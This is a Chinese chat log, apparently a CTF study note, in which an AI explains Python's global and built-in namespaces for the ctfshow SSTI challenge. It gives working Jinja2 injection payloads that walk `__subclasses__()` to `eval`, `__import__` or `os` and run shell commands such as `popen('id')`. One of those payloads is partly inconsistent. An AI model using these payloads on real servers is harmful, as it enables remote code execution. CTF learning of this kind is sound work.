[[ctfshow361ssti初学]]
#python #命名空间
## 用户
```
但由于 `eval` 在全局域中是一个 `built-in function` 即 内置函数 ，所以我们无法直接通过 `__globals__['eval']` 来直接调用内置函数，Python 的内置函数和对象通常是全局可用的，但它们通常不是函数内部的一部分。因此，要在函数内部访问内置函数（如 `eval`）或内置对象（如 `os`），需要通过 `__builtins__` 来访问。////////////详细讲解这段话
```

---

## Sonnet-4.6

这段话的核心是解释 Python 中 **全局命名空间** 和 **内置命名空间** 的区别，以及为什么 `__globals__['eval']` 找不到 `eval`，而必须通过 `__builtins__` 访问。

---

## Python 的命名空间层级

Python 查找一个名字时，遵循 **LEGB** 规则：

```
Local → Enclosing → Global → Built-in
```

关键点：**Global** 和 **Built-in** 是两个完全独立的命名空间。

---

## `__globals__` 是什么？

每个函数对象都有一个 `__globals__` 属性，它指向该函数**定义时所在模块的全局命名空间**，本质上就是那个模块的 `globals()` 字典。

```python
x = 42

def foo():
    pass

print(foo.__globals__['x'])  # 42，能找到，因为 x 是全局变量
```

但是：

```python
def foo():
    pass

print(foo.__globals__.get('eval'))  # None！找不到！
```

`eval` 不在 `__globals__` 里，因为你从来没有在模块级别写过 `eval = ...`，它根本不属于全局命名空间。

---

## `eval` 到底住在哪里？

`eval` 是 Python 的**内置函数**，它住在一个独立的层级 —— **内置命名空间（Built-in Namespace）**，对应的对象是 `builtins` 模块。

```
模块的 globals() 字典         ← __globals__ 指向这里
        ↓（找不到时继续向上）
builtins 模块的命名空间        ← eval、print、len、open 等都在这里
```

你平时能直接写 `eval(...)` 而不报错，是因为 Python **自动** 在全局找不到时去内置命名空间里找，这是解释器隐式帮你做的，并不代表 `eval` 进入了全局字典。

验证一下：

```python
import builtins

print('eval' in globals())        # False，全局里没有
print(hasattr(builtins, 'eval'))  # True，内置里有
```

---

## `__builtins__` 是访问内置命名空间的入口

在模块级别，Python 会自动在全局命名空间里注入一个特殊的键 `__builtins__`，它是访问内置命名空间的桥梁。

```python
def foo():
    pass

# 通过 __globals__ 拿到 __builtins__，再从中取 eval
builtins_ref = foo.__globals__['__builtins__']

# 注意：__builtins__ 的类型在不同场景下不一样
if isinstance(builtins_ref, dict):
    evil = builtins_ref['eval']          # 在某些环境下是字典
else:
    evil = getattr(builtins_ref, 'eval') # 在主模块下是 builtins 模块对象

print(evil('1 + 1'))  # 2
```

---

## `__builtins__` 的类型差异（重要细节）

这是一个经典的 Python 小陷阱：

|场景|`__builtins__` 的类型|
|---|---|
|在 `__main__` 模块中|`builtins` 模块对象本身|
|在其他被导入的模块中|`builtins.__dict__` 字典|

所以健壮的写法需要判断类型，或者直接 `import builtins` 更稳妥。

---

## 整体结构总结

```
你写的代码（某个 .py 文件）
│
├── 全局命名空间 globals() / __globals__
│     ├── 你自己定义的变量、函数、类
│     ├── import 进来的模块
│     └── __builtins__  ← 这是一个"传送门"，指向内置命名空间
│
└── 内置命名空间（builtins 模块）
      ├── eval、exec、print、len、open ...
      ├── int、str、list、dict ...
      └── Exception、TypeError ...
```

所以那段话的意思简单来说就是：**`eval` 不住在你的全局字典里，它住在更底层的内置命名空间里；`__globals__` 只能看到全局字典，所以必须通过 `__globals__['__builtins__']` 这个传送门才能拿到它。**

---

## 用户

| 场景               | `__builtins__` 的类型     |     |
| ---------------- | ---------------------- | --- |
| 在 `__main__` 模块中 | `builtins` 模块对象本身      |     |
| 在其他被导入的模块中       | `builtins.__dict__` 字典 |     |
|                  |                        |     |

这两个内容对于ssti有什么影响？

---

## Sonnet-4.6

## 背景：SSTI 的执行环境

SSTI 注入点运行在 **Web 应用的模块里**，而不是 `__main__`。

所以你几乎永远面对的是：

```
__builtins__  →  dict（字典）
```

而不是模块对象。

---

## 两种类型的访问方式不同

### 场景一：`__builtins__` 是模块对象（`__main__`，本地测试时）

```python
__builtins__.eval("__import__('os').system('id')")
# 或
getattr(__builtins__, 'eval')
```

### 场景二：`__builtins__` 是字典（实际 SSTI 环境）

```python
__builtins__['eval']("__import__('os').system('id')")
# 或
__builtins__['__import__']('os').system('id')
```

---

## 对 SSTI Payload 的直接影响

这就是为什么很多人**本地测试 Payload 成功，打靶场却失败**的原因之一。

```python
# 本地 __main__ 测试，__builtins__ 是模块对象，这样写能跑
''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__'].eval(...)

# 但实际 SSTI 环境，__builtins__ 是 dict，必须用方括号
''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['eval'](...)
```

---

## 稳健的通用做法

因为不确定类型，实战中更常见的是**绕过 `__builtins__` 的类型问题**，直接用 `__import__`：

```python
# __import__ 本身也在 __builtins__ 里，但更常见的是走子类链找到 os
# 直接用内置的 __import__ key
__globals__['__builtins__']['__import__']('os').popen('id').read()
```

或者走更稳妥的子类链路，找到已经 `import os` 的类，从它的 `__globals__` 里直接拿 `os`，完全绕开 `__builtins__` 的类型问题：

```python
# 找一个 __globals__ 里已经有 os 的函数/类
''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()
```

---

## 总结

|                   | `__main__`（本地）      | Web 应用模块（SSTI 实战）                                    |
| ----------------- | ------------------- | ---------------------------------------------------- |
| `__builtins__` 类型 | 模块对象                | 字典 `dict`                                            |
| 取 `eval`          | `__builtins__.eval` | `__builtins__['eval']`                               |
| 常见坑               | 本地跑通                | 同样 Payload 打靶失败                                      |
| 通用建议              | —                   | 优先走 `__globals__['os']` 或 `['__import__']` 方式，跳过类型判断 |

实战写 Payload 时，**默认当它是字典**，用 `['key']` 方式访问，是最保险的习惯。

---
## 用户

对于两种buitins分别该如何处理？

---

## Sonnet-4.6

直接看代码和判断逻辑：

---

## 判断类型

```python
b = some_func.__globals__['__builtins__']

if isinstance(b, dict):
    print("字典类型")
else:
    print("模块对象类型")
```

---

## 两种类型的完整处理方式

### 字典类型（Web/SSTI 实战环境）

```python
b = func.__globals__['__builtins__']

# 取函数
b['eval']("1+1")
b['exec']("import os")
b['__import__']('os').popen('id').read()

# 取所有可用名称
b.keys()
```

### 模块对象类型（`__main__` / 本地环境）

```python
b = func.__globals__['__builtins__']

# 取函数
b.eval("1+1")
getattr(b, 'eval')("1+1")
getattr(b, '__import__')('os').popen('id').read()

# 取所有可用名称
dir(b)
```

---

## 写一个兼容两种类型的通用函数

```python
def get_builtin(name):
    import sys
    b = sys._getframe(1).f_globals.get('__builtins__')
    
    if isinstance(b, dict):
        return b[name]
    else:
        return getattr(b, name)

# 使用
get_builtin('eval')("1+1")
get_builtin('__import__')('os').popen('id').read()
```

---

## SSTI Payload 的兼容写法

在模板注入场景里无法用 `isinstance`，所以用另一种思路——**把模块对象也转成字典**：

```python
# 无论哪种类型，先统一转成字典
# 模块对象有 __dict__，字典本身没有 __dict__ 属性但有 get 方法

b = func.__globals__['__builtins__']

# 统一转换
b_dict = b if isinstance(b, dict) else b.__dict__

# 之后统一用字典方式访问
b_dict['eval']("1+1")
```

在 SSTI 模板语法中的实际体现（以 Jinja2 为例）：

```python
# 利用 __dict__ 统一化，在模板里
{{
  [].__class__.__mro__[1].__subclasses__()[N]
  .__init__.__globals__['__builtins__']
  .__dict__['eval']('__import__("os").popen("id").read()')
}}
```

> 这里 `.__dict__` 的作用是：如果 `__builtins__` 是模块对象，`.__dict__` 把它转成字典；如果已经是字典，则直接 `['eval']` 访问即可（但字典没有 `.__dict__`，需判断）。

---

## 最稳的实战建议

与其处理 `__builtins__` 的类型问题，不如**直接绕过它**：

```python
# 方法1：找已经 import 了 os 的类的 __globals__，直接拿 os
func.__globals__['os'].popen('id').read()

# 方法2：通过 __globals__ 拿 __import__（它在全局里，不在 builtins 里也可能存在）
func.__globals__['__builtins__']['__import__']('os')  # 字典情况
```

两种 `__builtins__` 类型的核心差异只有一句话：**字典用 `[]`，模块对象用 `.` 或 `getattr`**，兼容处理就是先判断类型再选择访问方式，或者统一通过 `.__dict__` 转换。